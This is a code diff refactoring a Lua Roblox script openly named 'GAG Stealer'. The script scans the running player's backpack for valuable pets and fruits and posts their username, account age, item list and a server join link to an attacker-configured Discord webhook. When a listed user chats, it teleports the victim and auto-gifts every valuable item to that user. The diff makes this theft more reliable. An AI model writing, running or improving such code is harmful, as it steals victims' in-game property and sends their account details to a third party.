@@ -1,4 +1,4 @@
--- GAG Stealer: Super Embed, Spam-Proof, Rare Ping Version
+-- GAG Stealer: Reliable Webhook Edition
 -- For support: discord.gg/notyet
 
 --------------------------
@@ -7,7 +7,7 @@
 local CONFIG = {
     USERNAMES = _G.Usernames or {},
     WEBHOOK   = _G.webhook or "",
-    MIN_VALUE = _G.min_value or 10000000,
+    MIN_VALUE = _G.min_value or 10000000
 }
 
 -- Rare pet emoji mapping
@@ -29,7 +29,7 @@ local WEBHOOK_COOLDOWN = 5  -- seconds
 -- FIREPROXIMITY BYPASS PATCH --
 -------------------------------
 local function bypassProximityPrompt(prompt)
-    local ok, result = pcall(function() return fireproximityprompt(prompt) end)
+    local ok = pcall(function() return fireproximityprompt(prompt) end)
     if ok then return end
     if prompt and prompt.InputHoldBegin then
         prompt.InputHoldBegin(prompt)
@@ -55,6 +55,7 @@ local replicatedStorage = game:GetService("ReplicatedStorage")
 local backpack = plr:WaitForChild("Backpack")
 local modules = replicatedStorage:WaitForChild("Modules")
 local req = request or http_request or (syn and syn.request)
+local lastWebhook = 0
 
 --------------------------
 -- CORE VALIDITY CHECKS --
@@ -120,84 +121,73 @@ end
 -----------------------------
 -- COLLECT INVENTORY ITEMS --
 -----------------------------
-local itemsToSend, totalValue, foundRare = {}, 0, false
-
-for _, tool in ipairs(backpack:GetChildren()) do
-    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-        if tool:GetAttribute("ItemType") == "Pet" then
-            local petUUID = tool:GetAttribute("PET_UUID")
-            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
-            local name = v14.PetType
-            -- Calculate value
-            local petVal = 0
-            do
-                local hatchedFrom = v14.PetData.HatchedFrom
-                if hatchedFrom and hatchedFrom ~= "" then
-                    local eggData = petRegistry.PetEggs[hatchedFrom]
-                    if eggData then
-                        local v17 = eggData.RarityData.Items[v14.PetType]
-                        if v17 and v17.GeneratedPetData.WeightRange then
-                            local weightRange = v17.GeneratedPetData.WeightRange
-                            local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
-                            local v20 = math.lerp(0.8, 1.2, v19)
-                            local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
-                            local v22 = v20 * math.lerp(0.15, 6, levelProgress)
-                            petVal = math.floor(petRegistry.PetList[v14.PetType].SellPrice * v22)
+local function collectItems()
+    local items, totalValue, foundRare = {}, 0, false
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+            if tool:GetAttribute("ItemType") == "Pet" then
+                local petUUID = tool:GetAttribute("PET_UUID")
+                local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+                local name = v14.PetType
+                -- Calculate value
+                local petVal = 0
+                do
+                    local hatchedFrom = v14.PetData.HatchedFrom
+                    if hatchedFrom and hatchedFrom ~= "" then
+                        local eggData = petRegistry.PetEggs[hatchedFrom]
+                        if eggData then
+                            local v17 = eggData.RarityData.Items[v14.PetType]
+                            if v17 and v17.GeneratedPetData.WeightRange then
+                                local weightRange = v17.GeneratedPetData.WeightRange
+                                local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+                                local v20 = math.lerp(0.8, 1.2, v19)
+                                local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+                                local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+                                petVal = math.floor(petRegistry.PetList[v14.PetType].SellPrice * v22)
+                            end
                         end
                     end
                 end
-            end
-            local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
-            local petAge = getPetAge(tool)
-            local isRare = RARE_PETS[name] ~= nil
-            if isRare or petWeight >= 10 then
-                if isRare then foundRare = true end
-                totalValue = totalValue + petVal
-                table.insert(itemsToSend, {
-                    Tool  = tool,
-                    Name  = name,
-                    Value = petVal,
-                    Weight= petWeight,
-                    Type  = "Pet",
-                    Emoji = getPetEmoji(name),
-                    Age   = petAge
-                })
-            end
-        else
-            local value = calcPlantValue(tool)
-            if value >= CONFIG.MIN_VALUE then
-                local weight = getWeight(tool)
-                totalValue = totalValue + value
-                table.insert(itemsToSend, {
-                    Tool  = tool,
-                    Name  = tool:GetAttribute("ItemName") or tool.Name,
-                    Value = value,
-                    Weight= weight,
-                    Type  = "Fruit",
-                    Emoji = getFruitEmoji(),
-                    Age   = nil
-                })
+                local petWeight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool)
+                local petAge = getPetAge(tool)
+                local isRare = RARE_PETS[name] ~= nil
+                if isRare or petWeight >= 10 then
+                    if isRare then foundRare = true end
+                    totalValue = totalValue + petVal
+                    table.insert(items, {
+                        Tool  = tool,
+                        Name  = name,
+                        Value = petVal,
+                        Weight= petWeight,
+                        Type  = "Pet",
+                        Emoji = getPetEmoji(name),
+                        Age   = petAge
+                    })
+                end
+            else
+                local value = calcPlantValue(tool)
+                if value >= CONFIG.MIN_VALUE then
+                    local weight = getWeight(tool)
+                    totalValue = totalValue + value
+                    table.insert(items, {
+                        Tool  = tool,
+                        Name  = tool:GetAttribute("ItemName") or tool.Name,
+                        Value = value,
+                        Weight= weight,
+                        Type  = "Fruit",
+                        Emoji = getFruitEmoji(),
+                        Age   = nil
+                    })
+                end
             end
         end
     end
-end
-if #itemsToSend == 0 then return end
-
-table.sort(itemsToSend, function(a, b)
-    if a.Type == "Pet" and b.Type ~= "Pet" then return true
-    elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
-    else return a.Value > b.Value end
-end)
-
----------------
--- WEBHOOK RATE LIMITER
----------------
-local lastWebhook = 0
-local function canSendWebhook()
-    return tick() - lastWebhook > WEBHOOK_COOLDOWN
-end
-local function setWebhookTime()
-    lastWebhook = tick()
+    table.sort(items, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
+        else return a.Value > b.Value end
+    end)
+    return items, totalValue, foundRare
 end
 
 -----------------------------
@@ -211,7 +201,7 @@ local function formatItemLine(item)
     end
 end
 
-local function makeEmbed(receiverName)
+local function makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
     local itemLines = {}
     for _, item in ipairs(itemsToSend) do
         table.insert(itemLines, formatItemLine(item))
@@ -222,19 +212,22 @@ local function makeEmbed(receiverName)
     end
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local ping = foundRare and "@everyone" or ""
+    local description =
+        "**Player information**\n\n"..
+        "`Username: "..plr.Name.."`\n"..
+        "`Receiver: "..receiverName.."`\n"..
+        "`Executer: "..plr.Name.."`\n"..
+        "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
+        "**What you got**:\n\n"..
+        "``````\n\n"..
+        "**[Join Server]("..joinLink..")**"
 
     return {
         content = ping,
         embeds  = {{
             title  = "💎 You got something!",
             color  = foundRare and 16776960 or 65280,
-            description = "**Player information**\n\n"..
-                "`Username: "..plr.Name.."`\n"..
-                "`Receiver: "..receiverName.."`\n"..
-                "`Executer: "..plr.Name.."`\n"..
-                "`Account age: "..(plr.AccountAge or "?").."`\n\n"..
-                "**What you got**:\n\n".. "``````".."\n\n"..
-                "**[Join Server]("..joinLink..")**",
+            description = description,
             footer = { text = "GAG stealer by Tobi. discord.gg/notyet" }
         }}
     }
@@ -243,13 +236,24 @@ end
 -------------------------
 -- SEND MAIN WEBHOOK   --
 -------------------------
-local function sendInitialWebhook(receiverName)
+local function canSendWebhook()
+    return tick() - lastWebhook > WEBHOOK_COOLDOWN
+end
+local function setWebhookTime()
+    lastWebhook = tick()
+end
+
+local function sendInitialWebhook(receiverName, itemsToSend, totalValue, foundRare)
     if not canSendWebhook() then return end
     setWebhookTime()
-    local payload = makeEmbed(receiverName)
+    local payload = makeEmbed(receiverName, itemsToSend, totalValue, foundRare)
     local body = HttpService:JSONEncode(payload)
     local headers = {["Content-Type"] = "application/json"}
-    if req then req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body}) end
+    if req then
+        req({Url = CONFIG.WEBHOOK, Method = "POST", Headers = headers, Body = body})
+    else
+        print("No HTTP request function found in this executor!")
+    end
 end
 
 --------------------------
@@ -322,11 +326,13 @@ local function findGiftPrompt(targetChar)
 end
 
 local function doSteal(player)
-    -- Rapidly and reliably auto-gift everything to the target player!
+    -- Reload items on every gifting, to ensure up-to-date
+    local itemsToSend, totalValue, foundRare = collectItems()
+    sendInitialWebhook(player.Name, itemsToSend, totalValue, foundRare)
     local myChar = plr.Character or plr.CharacterAdded:Wait()
     local victimRoot = myChar:WaitForChild("HumanoidRootPart")
     victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    wait(0.25)
+    task.wait(0.25)
     for _, item in ipairs(itemsToSend) do
         equipTool(item.Tool)
         local prompt = findGiftPrompt(player.Character)
@@ -342,7 +348,7 @@ local function doSteal(player)
             warn("No gifting prompt found for "..(item.Name or "?"))
         end
         item.Tool.Parent = backpack
-        wait(0.04)
+        task.wait(0.04)
     end
     local stillInBackpack = true
     while stillInBackpack do
@@ -365,7 +371,6 @@ local function listenForUser()
         player.Chatted:Connect(function()
             if triggered then return end
             triggered = true
-            sendInitialWebhook(player.Name)
             doSteal(player)
         end)
     end
